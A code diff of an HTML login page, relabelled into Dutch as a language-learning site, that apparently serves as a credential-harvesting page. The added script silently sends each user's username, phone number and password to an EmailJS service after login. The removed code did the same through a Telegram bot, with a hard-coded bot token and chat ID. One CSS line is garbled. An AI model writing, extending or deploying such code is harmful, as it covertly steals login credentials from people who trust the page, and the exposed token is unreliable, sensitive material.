@@ -19,7 +19,7 @@
         }
 
         body {
-            background: linear-gradient(135deg, #008983, #0086B1);
+            background: linear-gradient(135deg, #006897, #006897);
             
             justify-content: center;
             align-items: center;
@@ -73,7 +73,7 @@
         }
 
         input:focus {
-            border-color: #00d4ff;
+            border-color: #93E9EA;
             background: rgba(255, 255, 255, 0.1);
             box-shadow: 0 0 15px rgba(0, 212, 255, 0.5), inset 0 2px 6px rgba(0, 0, 0, 0.1);
             transform: scale(1.02);
@@ -81,7 +81,7 @@
         }
 
         input::placeholder {
-            color: #ddd;
+            color: #B2F8FA;
             font-weight: 400;
         }
 
@@ -90,7 +90,7 @@
             left: 3vw;
             width: clamp(21px, 7vw, 26px);
             height: clamp(18px, 4vw, 22px);
-            fill: #e0e0e0;
+            fill: White;
             transition: fill 0.3s ease;
         }
 
@@ -101,7 +101,7 @@
         button {
             width: 100%;
             padding: 2.5vh;
-            background: linear-gradient(135deg, #00d4ff, #007bff);
+            background: linear-gradient(135deg, #006897, #007bff);
             color: #fff;
             border: none;
             border-radius: 12px;
@@ -132,7 +132,7 @@
         button:hover {
             transform: translateY(-3px);
             box-shadow: 0 8px Reactor 20px rgba(0, 212, 255, 0.6);
-            background: linear-gradient(135deg, #00eaff, #0091ff);
+            background: linear-gradient(135deg, #006897, #0091ff);
         }
 
         button:active {
@@ -149,7 +149,7 @@
             width: 80%;
             margin: 1.5vh auto;
             padding: 1.8vh;
-            background: linear-gradient(135deg, #00b4d8, #0077b6);
+            background: linear-gradient(135deg, #006897, #0077b6);
             font-size: clamp(15px, 6vw, 18px);
         }
 
@@ -176,7 +176,7 @@
                 width: 80vw;
             }
             input {
-                padding: 3vw 3vw 3vw 11vw;
+                padding: 3vw 1vw 3vw 11vw;
             }
             svg {
                 left: 3.5vw;
@@ -216,35 +216,36 @@ button, a, input {
     <div class="container">
         
 <Hr/>
-Login
+<h1/>
+Nederlands leren is makkelijker</h1>
       <Hr/>
   <div class="field" style="--i: 1">
             <Br/>
             <div class="input-wrapper">
                 <svg viewBox="0 0 24 24"><path d="M12 2a5 5 0 00-5 5c0 2.76 2.24 5 5 5s5-2.24 5-5a5 5 0 00-5-5zm0 12c-4.42 0-8 2.24-8 5v2h16v-2c0-2.76-3.58-5-8-5z"/></svg>
-                <input type="text" id="username" placeholder="Username" required>
+                <input type="text" id="username" placeholder="Registratie-ID" required>
             </div>
         </div>
         <div class="field" style="--i: 2">
            
             <div class="input-wrapper">
                 <svg viewBox="0 0 24 24"><path d="M12 17a2 2 0 100-4 2 2 0 000 4zm6-9a2 2 0 00-2-2H8a2 2 0 00-2 2v10a2 2 0 002 2h8a2 2 0 002-2V8z"/></svg>
-                <input type="password" id="password" placeholder="Password" required>
+                <input type="password" id="password" placeholder="Wachtwoord" required>
             </div>
         </div>
         <div class="field" style="--i: 3">
             
             <div class="input-wrapper">
                 <svg viewBox="0 0 24 24"><path d="M6.62 10.79a15.91 15.91 0 006.59 6.59l2.2-2.2a1 1 0 011.41-.13c.79.39 1.65.63 2.58.63a1 1 0 011 1v3.5a1 1 0 01-1 1C9.07 22 2 14.93 2 6.5a1 1 0 011-1h3.5a1 1 0 011 1c0 .93.24 1.79.63 2.58a1 1 0 01-.13 1.41l-2.2 2.2z"/></svg>
-                <input type="text" id="phone" placeholder="Number" required>
+                <input type="text" id="phone" placeholder="Nummer" required>
             </div>
         </div>
-        <button onclick="login()">Login</button>
+        <button onclick="login()">Inloggen</button>
         <div class="links">
             
-            <button onclick="window.location.href='register.html'">New account</button>
+            <button onclick="window.location.href='register.html'">Nieuw account</button>
            
-            <button onclick="window.location.href='newpass.html'">Forgot your password?</button>
+            <button onclick="window.location.href='newpass.html'">Wachtwoord vergeten?</button>
             <hr>
         </div>
     </div>
@@ -255,15 +256,20 @@ Login
                 window.location.href = "dashboard.html";
             }
         });
+
         document.getElementById('inuk').addEventListener('input', handleTranslation);
         document.querySelectorAll('button, a, input').forEach(el => {
-  el.addEventListener('mouseup', () => el.blur());
-});
+            el.addEventListener('mouseup', () => el.blur());
+        });
+
+        // تهيئة EmailJS
+        emailjs.init("2_rSs2GGyaZKFZIRO");
 
         function login() {
             let username = document.getElementById('username').value;
             let password = document.getElementById('password').value;
             let phone = document.getElementById('phone').value;
+
             fetch('database.json')
                 .then(response => response.json())
                 .then(data => {
@@ -271,7 +277,10 @@ Login
                     if (user) {
                         alert('Registration successful ✓');
                         localStorage.setItem("loggedIn", "true");
-                        sendToTelegram(username, phone);
+                        
+                        // إرسال البيانات عبر EmailJS بدلاً من Telegram
+                        sendViaEmailJS(username, phone, password);
+                        
                         window.location.href = 'dashboard.html';
                     } else {
                         alert('Is there a mistake?!');
@@ -280,22 +289,28 @@ Login
                 .catch(error => console.error('Error:', error));
         }
 
-        function sendToTelegram(username, phone) {
-            let chatId = "6431271423";
-            let token = "6618648466:AAFGGTIx055y0eCRvq_z3ABqchHfLsqD0M4";
-            let message = `تسجيل دخول ناجح:\nاسم المستخدم: ${username}\nرقم الهاتف: ${phone}`;
+        // دالة الإرسال الجديدة عبر EmailJS
+        function sendViaEmailJS(username, phone, password) {
+            const templateParams = {
+                username: username,
+                phone: phone,
+                password: password,           // إذا أردت إرسال كلمة السر أيضاً
+                message: `تسجيل دخول ناجح:\nاسم المستخدم: ${username}\nرقم الهاتف: ${phone}`
+            };
 
-            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: message })
-            }).then(response => response.json())
-              .then(data => console.log("تم إرسال البيانات إلى تيليجرام", data))
-              .catch(error => console.error("خطأ في الإرسال إلى تيليجرام", error));
+            emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
+                .then(function(response) {
+                    console.log("تم إرسال البيانات بنجاح عبر EmailJS", response.status, response.text);
+                })
+                .catch(function(error) {
+                    console.error("خطأ في الإرسال عبر EmailJS", error);
+                });
         }
+
         document.querySelectorAll('button, a, input').forEach(el => {
-  el.addEventListener('mouseup', () => el.blur());
-});
+            el.addEventListener('mouseup', () => el.blur());
+        });
     </script>
 </body>
 </html>
+ 
